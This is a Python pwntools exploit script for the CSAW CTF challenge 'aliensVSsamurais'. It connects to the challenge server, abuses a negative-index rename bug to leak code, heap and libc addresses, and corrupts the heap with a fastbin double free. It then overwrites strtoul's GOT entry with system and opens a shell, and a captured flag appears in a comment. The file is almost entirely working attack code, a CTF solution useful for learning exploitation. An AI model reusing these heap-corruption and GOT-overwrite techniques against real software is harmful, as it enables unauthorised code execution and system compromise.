#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './aliensVSsamurais'
TARGET = ('pwn.chal.csaw.io', 9004)

if args.E: # or args.R:
    LIBC64 = './libc-2.23.so'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

code = ELF(BINARY)
libc = ELF(LIBC64)

def new_alien(size, name):
    r.sendlineafter('Brood mother, what tasks do we have today.\n', '1')
    r.sendlineafter('How long is my name?\n', str(size))
    r.sendlineafter('What is my name?', name)

def consume_alien(idx):
    r.sendlineafter('Brood mother, what tasks do we have today.\n', '2')
    r.sendlineafter('Which alien is unsatisfactory, brood mother?\n', str(idx))

r.sendlineafter('Daimyo, nani o shitaidesu ka?\n', '3')

new_alien(0x10, '0'*0x8)

#attach(0xd03)
# leak text
idx = 0xffffffffffffffff - (0x2020c0 - 0x202070)/8 + 1
r.sendlineafter('Brood mother, what tasks do we have today.\n', '3')
r.sendlineafter('which one of my babies would you like to rename?', str(idx))
r.recvuntil('Oh great what would you like to rename ')
code.address = u64(r.recv(6)+'\x00\x00') - 0x202070
log.info(hex(code.address))
r.send(p64(code.address + 0x2020c0))

new_alien(0x60, '1'*8)
new_alien(0x60, '2'*8)
new_alien(0x60, '3'*8)

idx = 0xffffffffffffffff - (0x2020c0 - 0x202070)/8 + 1
r.sendlineafter('Brood mother, what tasks do we have today.\n', '3')
r.sendlineafter('which one of my babies would you like to rename?', str(idx))
r.recvuntil('Oh great what would you like to rename ')
heap = u64(r.recv(6)+'\x00\x00') - 0x450
log.info(hex(heap))
r.send(p64(heap + 0x490))

consume_alien(0)
consume_alien(2)
consume_alien(1)

new_alien(0x60, p64(code.address + 0x20208d))
new_alien(0x60, '5'*8)
new_alien(0x60, '6'*8)
p  = 'x'*3
p += p64(code.address+0x2020a8)
p += p64(code.address+0x202058)
new_alien(0x60, p)

idx = 0xffffffffffffffff - (0x2020c0 - 0x2020a0)/8 + 1
r.sendlineafter('Brood mother, what tasks do we have today.\n', '3')
r.sendlineafter('which one of my babies would you like to rename?', str(idx))
r.recvuntil('Oh great what would you like to rename ')
libc.address = u64(r.recv(6)+'\x00\x00') - libc.sym['strtoul']
log.info(hex(libc.address))
r.send(p64(libc.sym['system']))

r.sendline('/bin/sh\x00')
# flag{s000000000000maa@@@@@nnnnnYYYB@@@@@@neeeelinggs}
#0x2020c0-
#0x2020c0-
#attach(0x400a32)
r.interactive()


